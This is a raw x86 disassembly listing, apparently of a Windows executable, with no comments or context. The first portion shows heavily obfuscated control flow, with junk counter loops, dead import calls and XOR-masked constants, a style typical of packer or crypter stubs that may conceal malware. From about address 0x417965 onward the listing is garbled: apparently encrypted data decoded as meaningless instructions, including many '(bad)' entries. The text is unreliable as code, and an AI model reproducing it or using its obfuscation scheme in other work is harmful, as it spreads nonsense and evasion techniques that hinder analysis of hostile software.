  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d75
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     dl,ch
  417972:	jle    0x41792e
  417974:	mov    ah,0x84
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	lods   al,BYTE PTR ds:[esi]
  41797e:	bnd jno 0x41799f
  417981:	push   0x3c
  417983:	jp     0x41799a
  417985:	stos   DWORD PTR es:[edi],eax
  417986:	mov    bl,0x93
  417988:	fnstenv [eax+edi*1+0x3b]
  41798c:	fiadd  DWORD PTR [esi-0x7050e12a]
  417992:	sub    BYTE PTR [ebx-0x28],bl
  417995:	inc    ecx
  417996:	add    DWORD PTR [edx],ecx
  417998:	pop    eax
  417999:	add    eax,0x4e0e8d8e
  41799e:	ds stc 
  4179a0:	mov    ebx,0x4313d2c1
  4179a5:	inc    esp
  4179a6:	fild   DWORD PTR [edi+0x57]
  4179a9:	rcl    BYTE PTR [edx-0x2b],1
  4179ac:	cli    
  4179ad:	add    DWORD PTR [edi+0x4],0xf8435401
  4179b4:	push   ebp
  4179b5:	lds    esi,FWORD PTR [eax-0x695fa141]
  4179bb:	pop    esp
  4179bc:	xchg   ebx,eax
  4179bd:	jle    0x417953
  4179bf:	add    DWORD PTR [eax],eax
  4179c1:	pop    edx
  4179c2:	stc    
  4179c3:	fidiv  DWORD PTR [ecx+0x5a]
  4179c6:	dec    esp
  4179c7:	sub    eax,0xfd1ba181
  4179cc:	hlt    
  4179cd:	sub    DWORD PTR [ebx+0x4bd5accb],edx
  4179d3:	mov    bl,0xe8
  4179d5:	jg     0x417981
  4179d7:	ret    0xb0e2
  4179da:	pushf  
  4179db:	sbb    BYTE PTR [edi+0x33f31352],dl
  4179e1:	add    dh,BYTE PTR [ebp-0x370aec17]
  4179e7:	ret    0xe6a5
  4179ea:	and    BYTE PTR [ecx-0xe9c8e5c],0x77
  4179f1:	div    DWORD PTR [ecx+0x7b]
  4179f4:	enter  0xdce,0xe
  4179f8:	mov    ah,0x11
  4179fa:	add    bh,BYTE PTR [esi+0x273ddd26]
  417a00:	ror    dl,0x5c
  417a03:	jbe    0x417993
  417a05:	pop    es
  417a06:	push   ecx
  417a07:	dec    esi
  417a08:	mov    ecx,0x2cd213a1
  417a0d:	push   eax
  417a0e:	mov    eax,0xe762d0
  417a13:	mul    DWORD PTR [esi+0x75]
  417a16:	in     al,dx
  417a17:	mov    al,0xfd
  417a19:	mov    ebx,DWORD PTR [esi-0x55]
  417a1c:	dec    ecx
  417a1d:	xchg   DWORD PTR [ecx-0x7e],esi
  417a20:	stos   BYTE PTR es:[edi],al
  417a21:	mov    ss,WORD PTR ss:[esi+0x62]
  417a25:	xchg   ebp,eax
  417a26:	adc    esi,DWORD PTR [esi]
  417a28:	push   esi
  417a29:	clc    
  417a2a:	scas   eax,DWORD PTR es:[edi]
  417a2b:	jno    0x417a14
  417a2d:	or     eax,0x6d944929
  417a32:	and    al,0x45
  417a34:	mov    ecx,0x88f78fd4
  417a39:	push   eax
  417a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a3b:	out    0x60,al
  417a3d:	in     eax,0x21
  417a3f:	push   esp
  417a40:	pop    eax
  417a41:	pop    eax
  417a42:	adc    eax,0xa622afcc
  417a47:	push   ebx
  417a48:	gs clc 
  417a4a:	aad    0xbf
  417a4c:	ror    BYTE PTR [ebp-0x3b],0xda
  417a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a51:	mov    al,ds:0xb3925f6a
  417a56:	mov    esi,0x86ba3c22
  417a5b:	xchg   edx,eax
  417a5c:	mov    dh,0x4a
  417a5e:	xchg   esi,eax
  417a5f:	xor    BYTE PTR [esi+0x50c6cc10],dl
  417a65:	sub    ebp,DWORD PTR [ecx+0x15]
  417a68:	jmp    0x417a95
  417a6a:	or     cl,BYTE PTR [eax]
  417a6c:	test   DWORD PTR fs:[ecx+0xdc0383e],esi
  417a73:	add    dh,BYTE PTR [edi]
  417a75:	mov    edi,0xcea3e685
  417a7a:	add    DWORD PTR [eax],0xffffffa9
  417a7d:	(bad)  
  417a7e:	(bad)  
  417a7f:	pop    ss
  417a80:	ret    
  417a81:	mov    al,BYTE PTR [ebx]
  417a83:	popa   
  417a84:	push   ds
  417a85:	mov    ebp,0xe0d69740
  417a8a:	(bad)  
  417a8b:	cdq    
  417a8c:	jns    0x417a7b
  417a8e:	or     ah,0xac
  417a91:	adc    al,0x2d
  417a93:	outs   dx,BYTE PTR ds:[esi]
  417a94:	cmovg  ebp,DWORD PTR [edi+0x64209841]
  417a9b:	add    eax,0x15ec96e8
  417aa0:	repz aas 
  417aa2:	inc    edx
  417aa3:	dec    esi
  417aa4:	jno    0x417afe
  417aa6:	mov    ecx,edi
  417aa8:	jb     0x417a81
  417aaa:	shl    DWORD PTR ds:0x704e88bc,cl
  417ab0:	dec    edi
  417ab1:	fidivr WORD PTR [esp+ebx*1]
  417ab4:	int3   
  417ab5:	arpl   WORD PTR [esp+ecx*2+0x18],sp
  417ab9:	aas    
  417aba:	mov    dl,0x44
  417abc:	int3   
  417abd:	arpl   WORD PTR [edi+0x2a],cx
  417ac0:	nop
  417ac1:	push   eax
  417ac3:	inc    edi
  417ac4:	not    DWORD PTR [ebp-0x34dc1ef5]
  417aca:	cld    
  417acb:	push   esp
  417acc:	sbb    al,0x99
  417ace:	pop    eax
  417acf:	cdq    
  417ad0:	sub    eax,0xc16b2607
  417ad5:	push   ebp
  417ad6:	aaa    
  417ad7:	repnz push 0xffffffc5
  417ada:	inc    sp
  417adc:	jne    0x417b52
  417ade:	es push edx
  417ae0:	les    edx,FWORD PTR [edi]
  417ae2:	inc    ecx
  417ae3:	xchg   ecx,eax
  417ae4:	in     eax,0x5a
  417ae6:	lock ret 
  417ae8:	sbb    BYTE PTR [ebx-0x211e76db],bh
  417aee:	pop    ebx
  417aef:	jb     0x417b47
  417af1:	(bad)  
  417af2:	das    
  417af3:	and    edx,DWORD PTR [ebx-0x7d]
  417af6:	jp     0x417af8
  417af8:	lock mov cl,0xed
  417afb:	xlat   BYTE PTR ds:[ebx]
  417afc:	xchg   edx,eax
  417afd:	jno    0x417a83
  417aff:	push   edi
  417b00:	xor    cl,al
  417b02:	xor    eax,0xadd4b992
  417b07:	es jnp 0x417b16
  417b0a:	cli    
  417b0b:	retw   
  417b0d:	clc    
  417b0e:	fidivr WORD PTR [ebp+ecx*2-0x6d01c09f]
  417b15:	loopne 0x417b8e
  417b17:	out    0xa4,al
  417b19:	sti    
  417b1a:	(bad)
  417b1f:	addr16 jmp 0xc97a2292
  417b25:	dec    edi
  417b26:	fucomip st,st(6)
  417b28:	popa   
  417b29:	je     0x417ada
  417b2b:	push   0xee31a262
  417b30:	sbb    cl,BYTE PTR [eax-0x661341c6]
  417b36:	bound  edx,QWORD PTR [edx+0x3ad6e6e2]
  417b3c:	jnp    0x417b2a
  417b3e:	xchg   DWORD PTR [eax+edi*2-0x80],ebx
  417b42:	inc    esi
  417b43:	cli    
  417b44:	dec    edi
  417b45:	and    ch,BYTE PTR [esi-0x7197720f]
  417b4b:	mov    ah,bh
  417b4d:	shl    ecx,cl
  417b4f:	in     eax,0x43
  417b51:	pusha  
  417b52:	psrlq  mm7,QWORD PTR [ebx-0x43]
  417b56:	loop   0x417ae6
  417b58:	mov    WORD PTR [eax-0x4],ds
  417b5b:	push   edx
  417b5c:	and    al,0x55
  417b5e:	xlat   BYTE PTR ds:[ebx]
  417b5f:	imul   ecx,DWORD PTR [edx-0x45],0x10902211
  417b66:	sub    al,0x89
  417b68:	addr16 enter 0x9c09,0x1b
  417b6d:	out    0x72,eax
  417b6f:	push   es
  417b70:	std    
  417b71:	sbb    dh,ah
  417b73:	sbb    al,0xfc
  417b75:	retf   0x9ce8
  417b78:	shl    BYTE PTR [edx],0x22
  417b7b:	jg     0x417b1f
  417b7d:	mov    esi,0x65e13061
  417b82:	rcr    ebp,0x73
  417b85:	mov    edi,DWORD PTR [ebx]
  417b87:	add    ebp,DWORD PTR [ebp+0x5d]
  417b8a:	inc    edx
  417b8b:	ret    0xa648
  417b8e:	retf   0xa0ea
  417b91:	rol    DWORD PTR [edx],cl
  417b93:	imul   edi,DWORD PTR [eax],0x55
  417b96:	xor    DWORD PTR [eax-0x24634549],ebp
  417b9c:	out    dx,al
  417b9d:	pushf  
  417b9e:	sub    DWORD PTR [ebp-0x2847e669],0xffffffcb
  417ba5:	imul   ebp,DWORD PTR [ecx-0x4b],0xa1b26a39
  417bac:	push   ebp
  417bad:	mov    esp,0x6fa0d5ad
  417bb2:	das    
  417bb3:	leave  
  417bb4:	lods   al,BYTE PTR ds:[esi]
  417bb5:	adc    al,0xfd
  417bb7:	and    BYTE PTR [ecx+ebx*8+0x4da99d1f],bl
  417bbe:	into   
  417bbf:	pop    esi
  417bc0:	mov    ch,0x26
  417bc2:	stc    
  417bc3:	int    0xca
  417bc5:	dec    edx
  417bc6:	into   
  417bc7:	push   cs
  417bc8:	push   eax
  417bc9:	sub    al,0xdd
  417bcb:	in     al,dx
  417bcc:	sub    edi,DWORD PTR [edx-0x686ec778]
  417bd2:	not    esi
  417bd4:	mov    DWORD PTR [ebp+edi*4-0x23],edx
  417bd8:	or     edx,edi
  417bda:	jle    0x417b79
  417bdc:	push   esp
  417bdd:	xor    BYTE PTR [ecx+0x2c],ah
  417be0:	jb     0x417b9c
  417be2:	adc    al,0x63
  417be4:	xchg   edi,eax
  417be5:	mov    ah,0xcb
  417be7:	adc    esp,DWORD PTR [eax+0x11]
  417bea:	call   0xdafb8650
  417bef:	push   es
  417bf0:	cdq    
  417bf1:	call   0x206b2169
  417bf6:	push   ebp
  417bf7:	bound  ebp,QWORD PTR ds:0x9a726bb4
  417bfd:	fucomip st,st(4)
  417bff:	stc    
  417c00:	and    DWORD PTR [eax+0x6c],ebp
  417c03:	push   ecx
  417c04:	mov    al,0xdd
  417c06:	push   ebp
  417c07:	fiadd  WORD PTR [ebp+0x66]
  417c0a:	imul   esi,DWORD PTR [eax],0x5a26640f
  417c10:	mov    DWORD PTR [ecx-0xc],edi
  417c13:	xor    cl,BYTE PTR [esi+0x11f2ea06]
  417c19:	mov    edi,0x6d987334
  417c1e:	or     al,bl
  417c20:	test   eax,0xd9237099
  417c25:	loop   0x417bb1
  417c27:	adc    BYTE PTR [ebp-0x62],ch
  417c2a:	rcr    DWORD PTR [edx+0x188c774b],0xc6
  417c31:	adc    al,0x1d
  417c33:	sahf   
  417c34:	jmp    0x417bcf
  417c36:	push   0x67c2ef4
  417c3b:	sub    edi,ecx
  417c3d:	adc    al,BYTE PTR [ecx]
  417c3f:	daa    
  417c40:	neg    DWORD PTR [edx-0x72]
  417c43:	sbb    DWORD PTR [ecx],edi
  417c45:	icebp  
  417c46:	(bad)  [ebp+0x42a61749]
  417c4c:	ret    0xc051
  417c4f:	xchg   ebp,eax
  417c50:	pop    eax
  417c51:	cli    
  417c52:	mov    ebp,DWORD PTR [edi-0x5b]
  417c55:	and    ah,BYTE PTR [ebp+0x304295a1]
  417c5b:	test   BYTE PTR [edi],dl
  417c5d:	imul   ebx,DWORD PTR [ecx+0x610208de],0x493e6fd5
  417c67:	cmc    
  417c68:	leave  
  417c69:	jecxz  0x417ce7
  417c6b:	out    dx,eax
  417c6c:	ret    0x2b2a
  417c6f:	test   al,0xb7
  417c71:	(bad)  
  417c73:	push   edx
  417c74:	scas   al,BYTE PTR es:[edi]
  417c75:	jnp    0x417cc4
  417c77:	cwde   
  417c78:	fbld   TBYTE PTR [eax+0x5479646d]
  417c7e:	into   
  417c7f:	mov    DWORD PTR ds:0x90b5d22a,ebp
  417c85:	aam    0xf7
  417c87:	push   0xffffffa9
  417c89:	dec    eax
  417c8a:	xchg   cl,al
  417c8c:	mov    dl,BYTE PTR [ecx+0x75]
  417c8f:	psubb  mm0,QWORD PTR [ecx]
  417c92:	add    al,0xb3
  417c94:	jle    0x417c3f
  417c96:	sbb    eax,0x608a5668
  417c9b:	xor    al,0xcc
  417c9d:	inc    edi
  417c9e:	inc    DWORD PTR [ebp*2+0x74b64307]
  417ca5:	in     eax,dx
  417ca6:	pop    esi
  417ca7:	push   esi
  417ca8:	cmp    BYTE PTR [esi+esi*8],ah
  417cab:	jle    0x417c37
  417cad:	push   0xffffffee
  417caf:	mov    ecx,0xd309259
  417cb4:	test   DWORD PTR [ecx+0x1d],esi
  417cb7:	and    DWORD PTR [edi-0x6bda1513],esi
  417cbd:	mov    al,0xe3
  417cbf:	das    
  417cc0:	xchg   esi,eax
  417cc1:	retf   
  417cc2:	jbe    0x417c52
  417cc4:	pusha  
  417cc5:	add    eax,0x3894fc6b
  417cca:	loop   0x417cdf
  417ccc:	inc    ebp
  417ccd:	and    DWORD PTR [eax],eax
  417ccf:	xchg   dl,bh
  417cd1:	lods   al,BYTE PTR ds:[esi]
  417cd2:	mov    dl,0x1f
  417cd4:	outs   dx,BYTE PTR ds:[esi]
  417cd5:	sar    DWORD PTR [edi+0x499868d8],0xb9
  417cdc:	sub    edi,edx
  417cde:	jb     0x417d1b
  417ce0:	test   al,0x8b
  417ce2:	pop    es
  417ce3:	add    al,0x18
  417ce5:	adc    BYTE PTR [esp+eax*1],al
  417ce8:	hlt    
  417ce9:	(bad)  
  417cea:	jbe    0x417ca7
  417cec:	mov    eax,ds:0x47bb9c42
  417cf1:	out    dx,al
  417cf2:	pop    eax
  417cf3:	jl     0x417c94
  417cf5:	mov    al,ds:0xe8f1d60b
  417cfa:	cmp    BYTE PTR [ebx-0xb],0xdc
  417cfe:	dec    ebx
  417cff:	xor    eax,DWORD PTR [ebp+0x1a1a83e9]
  417d05:	cwde   
  417d06:	push   0x55
  417d08:	outs   dx,BYTE PTR ds:[esi]
  417d09:	arpl   WORD PTR [ebp-0x1ebbe3cd],si
  417d0f:	(bad)  
  417d10:	fnstenv [edx-0x17]
  417d13:	ja     0x417cef
  417d15:	icebp  
  417d16:	jns    0x417cf6
  417d18:	push   edx
  417d19:	jmp    0x417d83
  417d1b:	sbb    DWORD PTR [edi],esi
  417d1d:	out    dx,al
  417d1e:	push   es
  417d1f:	lea    esp,[esi+0x1cb56d2e]
  417d25:	stos   BYTE PTR es:[edi],al
  417d26:	jb     0x417d82
  417d28:	jl     0x417cea
  417d2a:	xchg   ebx,eax
  417d2b:	mov    ecx,0xd1409ab9
  417d30:	fbld   TBYTE PTR [ebp+0x47221ef0]
  417d36:	loope  0x417d6f
  417d38:	shl    eax,cl
  417d3a:	xchg   DWORD PTR [eax],edi
  417d3c:	(bad)  
  417d3d:	xchg   edi,eax
  417d3e:	test   DWORD PTR [ebx-0x56],ebp
  417d41:	fadd   QWORD PTR [ebp-0x21b5f80e]
  417d47:	js     0x417cd9
  417d49:	out    0xd1,eax
  417d4b:	mov    ?,WORD PTR [eax+0x6c8a1038]
  417d51:	popf   
  417d52:	aaa    
  417d53:	call   0x2331:0x10970eed
  417d5a:	mov    WORD PTR [eax-0x26],ss
  417d5d:	mov    edx,0x116d7b1f
  417d62:	add    ch,BYTE PTR [edx+edx*8+0x5a3a37ab]
  417d69:	(bad)  
  417d6b:	mov    ecx,0xfa02f80
  417d70:	cmp    al,0x6c
  417d72:	mov    ebp,0xcb89022b
  417d77:	stos   BYTE PTR es:[edi],al
  417d78:	add    al,0x91
  417d7a:	test   BYTE PTR [edx-0x56],0xe0
  417d7e:	dec    esi
  417d7f:	stos   DWORD PTR es:[edi],eax
  417d80:	(bad)  
  417d81:	mov    dh,0x7e
  417d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d84:	mov    al,0xf2
  417d86:	or     al,0x11
  417d88:	push   ss
  417d89:	int    0x2c
  417d8b:	xor    BYTE PTR [ecx],al
  417d8d:	or     bh,dh
  417d8f:	out    dx,al
  417d90:	push   edi
  417d91:	scas   eax,DWORD PTR es:[edi]
  417d92:	imul   edx,DWORD PTR [ebx-0x5366e569],0xf6238f87
  417d9c:	cmc    
  417d9d:	jbe    0x417dd6
  417d9f:	outs   dx,DWORD PTR ds:[esi]
  417da0:	je     0x417d3f
  417da2:	out    dx,al
  417da3:	sbb    BYTE PTR [ecx-0x54804fe1],ah
  417da9:	mov    eax,ds:0x81eef417
  417dae:	inc    ecx
  417daf:	mov    al,0x7
